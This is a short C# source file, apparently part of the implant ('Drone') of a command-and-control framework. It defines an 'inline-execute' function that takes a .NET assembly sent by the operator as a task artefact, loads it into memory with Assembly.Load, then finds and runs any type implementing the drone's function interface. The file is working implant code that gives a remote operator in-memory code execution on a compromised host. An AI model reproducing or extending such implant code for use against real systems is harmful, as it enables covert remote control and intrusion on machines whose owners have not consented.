using System;
using System.Reflection;

using Drone.Interfaces;
using Drone.Models;

namespace Drone.Functions;

public class InlineExecute : DroneFunction
{
    public override string Name => "inline-execute";
    
    public override void Execute(DroneTask task)
    {
        var asm = Assembly.Load(task.Artefact);

        foreach (var type in asm.GetTypes())
        {
            if (!typeof(IDroneFunction).IsAssignableFrom(type))
                continue;
            
            var function = Activator.CreateInstance(type) as IDroneFunction;
            
            function?.Init(Drone);
            function?.Execute(task);
            
            return;
        }

        Drone.SendError(task.TaskId, "No instance of IDroneFunction found");
    }
}